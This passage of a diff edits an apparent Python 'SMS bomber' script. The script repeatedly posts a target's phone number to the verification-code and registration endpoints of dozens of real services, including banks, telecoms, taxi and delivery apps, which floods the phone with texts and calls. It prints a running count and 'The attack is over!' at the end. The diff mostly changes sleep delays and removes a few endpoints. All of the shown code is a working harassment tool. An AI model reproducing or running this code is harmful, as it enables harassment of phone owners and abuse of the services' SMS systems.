         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1403,7 +1380,7 @@ if call == str(2):
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
             R = R + 1
             print('[+] Rutube Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1414,7 +1391,7 @@ if call == str(2):
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1426,7 +1403,7 @@ if call == str(2):
                           data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
             R = R + 1
             print('[+] Smsint Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1438,7 +1415,7 @@ if call == str(2):
                 'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
             R = R + 1
             print('[+] oyorooms Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1451,7 +1428,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
             R = R + 1
             print('[+] MVIDEO Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1464,7 +1441,7 @@ if call == str(2):
                                                               'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
             R = R + 1
             print('[+] newnext Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1475,7 +1452,7 @@ if call == str(2):
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1488,7 +1465,7 @@ if call == str(2):
                                 'deliveryOption': 'sms'})
             R = R + 1
             print('[+] alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1499,7 +1476,7 @@ if call == str(2):
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1512,7 +1489,7 @@ if call == str(2):
                                 'params': {'phone': _phone}, 'id': '1'})
             R = R + 1
             print('[+] Sberbank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -1525,7 +1502,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1537,7 +1514,7 @@ if call == str(2):
                           data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
             R = R + 1
             print('[+] Delitime Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1553,7 +1530,7 @@ if call == str(2):
                           json={"phone": {"code": 1, "number": _phone}})
             R = R + 1
             print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1566,7 +1543,7 @@ if call == str(2):
                                 "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
             R = R + 1
             print('[+] ICQ Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1579,7 +1556,7 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1591,7 +1568,7 @@ if call == str(2):
                           data={"password": password, "application": "lkp", "login": "+" + _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1602,7 +1579,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1613,7 +1590,7 @@ if call == str(2):
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1624,7 +1601,7 @@ if call == str(2):
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] Lenta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1636,7 +1613,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1649,7 +1626,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
             R = R + 1
             print('[+] MVideo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -1661,33 +1638,10 @@ if call == str(2):
                           data={"st.r.phone": "+" + _phone})
             R = R + 1
             print('[+] OK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
-                          headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
-                          params={"phone": _phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))})
-            R = R + 1
-            print('[+] Qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -1696,7 +1650,7 @@ if call == str(2):
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2064,28 +2018,6 @@ if call == str(2):
             print("The attack is over! Press ENTER to close...")
             break
         try:
-            requests.post('https://plink.tech/register/', json={"phone": _phone})
-            R = R + 1
-            print('[+] Plink Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-        except:
-            print('[-] Error in sent!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
@@ -2212,7 +2144,7 @@ if call == str(2):
                                 "password": password, "phone_number": _phone, "username": username})
             R = R + 1
             print('[+] Twitch Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2224,7 +2156,7 @@ if call == str(2):
                           headers={'App-ID': 'cabinet'})
             R = R + 1
             print('[+] CabWiFi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2235,7 +2167,7 @@ if call == str(2):
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
             print('[+] wowworks Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2247,7 +2179,7 @@ if call == str(2):
                           json={"phone_number": "+" + _phone})
             R = R + 1
             print('[+] Eda.Yandex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2258,7 +2190,7 @@ if call == str(2):
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2271,7 +2203,7 @@ if call == str(2):
                                 "deliveryOption": "sms"})
             R = R + 1
             print('[+] Alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2282,7 +2214,7 @@ if call == str(2):
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2318,7 +2250,7 @@ if call == str(2):
                           data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                 'deviceToken': '*'}, headers={
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-            time.sleep(0)
+            time.sleep(1)
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -2327,7 +2259,7 @@ if call == str(2):
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
             R = R + 1
             print('[+] RuTaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2338,7 +2270,7 @@ if call == str(2):
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] BelkaCar Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2350,7 +2282,7 @@ if call == str(2):
                           data={'aj': '50', 'registration-phone': _phone})
             R = R + 1
             print('[+] StarPizzaCafe Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2362,7 +2294,7 @@ if call == str(2):
                           data={'phone_number': _phone}, headers={})
             R = R + 1
             print('[+] Tinder Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -2375,7 +2307,7 @@ if call == str(2):
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
             R = R + 1
             print('[+] Tinkoff Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2387,7 +2319,7 @@ if call == str(2):
             requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
             R = R + 1
             print('[+] Dostavista Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2400,7 +2332,7 @@ if call == str(2):
             requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
             R = R + 1
             print('[+] MonoBank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2412,7 +2344,7 @@ if call == str(2):
             requests.post('https://widgets.binotel.com/getcall/call/', {"status": "success", "GetCallID": 13302425})
             R = R + 1
             print('[+] binotel Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2424,7 +2356,7 @@ if call == str(2):
                          data={"phone": _phone})
             R = R + 1
             print('[+] SportMaster Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2436,7 +2368,7 @@ if call == str(2):
             requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
             R = R + 1
             print('[+] Alfalife Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2447,7 +2379,7 @@ if call == str(2):
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
             R = R + 1
             print('[+] KoronaPay Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -2461,7 +2393,7 @@ if call == str(2):
                                 "oferta": "on", })
             R = R + 1
             print('[+] GGbet Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2474,7 +2406,7 @@ if call == str(2):
                                 "getSysParam": "yes", })
             R = R + 1
             print('[+] ETM Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2486,7 +2418,7 @@ if call == str(2):
             requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })
             R = R + 1
             print('[+] TheLive Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2497,7 +2429,7 @@ if call == str(2):
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2508,7 +2440,7 @@ if call == str(2):
             requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
             R = R + 1
             print('[+] MyGames Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2522,7 +2454,7 @@ if call == str(2):
                                 "phone": (_phone, "+* (***) ***-**-**"), "email": _email, "city": "Москва", })
             R = R + 1
             print('[+] Zoloto585 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2533,7 +2465,7 @@ if call == str(2):
             requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
             R = R + 1
             print('[+] Kasta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2545,7 +2477,7 @@ if call == str(2):
                           data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
             R = R + 1
             print('[+] Тaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2558,7 +2490,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2570,7 +2502,7 @@ if call == str(2):
                           json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
             R = R + 1
             print('[+] Creditter Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2586,7 +2518,7 @@ if call == str(2):
                                 "SecondName": _name, "Phone": _phone, "Email": _email, })
             R = R + 1
             print('[+] Ingos Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2599,7 +2531,7 @@ if call == str(2):
                                 "email": "", "lang": "en", })
             R = R + 1
             print('[+] Admiralxxx Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2610,7 +2542,7 @@ if call == str(2):
             requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
             R = R + 1
             print('[+] Av Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2622,7 +2554,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2633,7 +2565,7 @@ if call == str(2):
             requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
             R = R + 1
             print('[+] City24 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2644,7 +2576,7 @@ if call == str(2):
             requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
             R = R + 1
             print('[+] SushiMaster Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2655,7 +2587,7 @@ if call == str(2):
             requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
             R = R + 1
             print('[+] MultiPlex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2666,7 +2598,7 @@ if call == str(2):
             requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
             R = R + 1
             print('[+] 3040 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2678,7 +2610,7 @@ if call == str(2):
                           data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })
             R = R + 1
             print('[+] Niyama Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2689,7 +2621,7 @@ if call == str(2):
             requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
             R = R + 1
             print('[+] VSK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2700,7 +2632,7 @@ if call == str(2):
             requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
             R = R + 1
             print('[+] EasyPay Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2712,7 +2644,7 @@ if call == str(2):
                           data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
             R = R + 1
             print('[+] Fix-Price Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -2724,7 +2656,7 @@ if call == str(2):
             requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
             R = R + 1
             print('[+] Tele2 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2735,7 +2667,7 @@ if call == str(2):
             requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
             R = R + 1
             print('[+] Finam Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2747,7 +2679,7 @@ if call == str(2):
                           params={"cb_fio": _name, "cb_phone": format(_phone, "+* *** *** ** **")})
             R = R + 1
             print('[+] MakiMaki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2761,7 +2693,7 @@ if call == str(2):
                           json={"loginId": "+" + _phone, "supportAllStates": True})
             R = R + 1
             print('[+] FlipKart Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2772,7 +2704,7 @@ if call == str(2):
             requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
             R = R + 1
             print('[+] Online.ua Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2783,7 +2715,7 @@ if call == str(2):
             requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
             R = R + 1
             print('[+] PlanetaKino Was sent!')
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2795,7 +2727,7 @@ if call == str(2):
                           json={"country": _codes[_code].upper(), "phone": _phone, })
             R = R + 1
             print('[+] OnTaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2806,7 +2738,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Iqos Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2818,7 +2750,7 @@ if call == str(2):
                           json={"mobile": "+" + _phone, "action": "confirm_mobile"})
             R = R + 1
             print('[+] Smart.Space Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -2832,7 +2764,7 @@ if call == str(2):
                                 'phone': _phone})
             R = R + 1
             print('[+] tarantino-family Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2848,7 +2780,7 @@ if call == str(2):
                                 "utc_offset": "120", })
             R = R + 1
             print('[+] Apteka Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2860,7 +2792,7 @@ if call == str(2):
                           headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
             R = R + 1
             print('[+] Uklon Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2872,7 +2804,7 @@ if call == str(2):
                           json={"phone": _phone, "otpId": 0})
             R = R + 1
             print('[+] Ozon Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2885,7 +2817,7 @@ if call == str(2):
                                  "gorod": "Москва", "approving_data": "1", })
             R = R + 1
             print('[+] Banki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2896,7 +2828,7 @@ if call == str(2):
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2908,7 +2840,7 @@ if call == str(2):
                           data={"firstname": _name, "phone": _phone, "email": _email})
             R = R + 1
             print('[+] Moyo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2919,7 +2851,7 @@ if call == str(2):
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
             R = R + 1
             print('[+] Helsi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2931,7 +2863,7 @@ if call == str(2):
                           json={"Phone": _phone, "Type": 1})
             R = R + 1
             print('[+] KinoLend Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2944,7 +2876,7 @@ if call == str(2):
                                 '_token': '*'})
             R = R + 1
             print('[+] PizzaHut Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2956,7 +2888,7 @@ if call == str(2):
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2967,7 +2899,7 @@ if call == str(2):
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
             R = R + 1
             print('[+] Rutube Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2978,7 +2910,7 @@ if call == str(2):
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -2990,7 +2922,7 @@ if call == str(2):
                           data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
             R = R + 1
             print('[+] Smsint Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -3002,7 +2934,7 @@ if call == str(2):
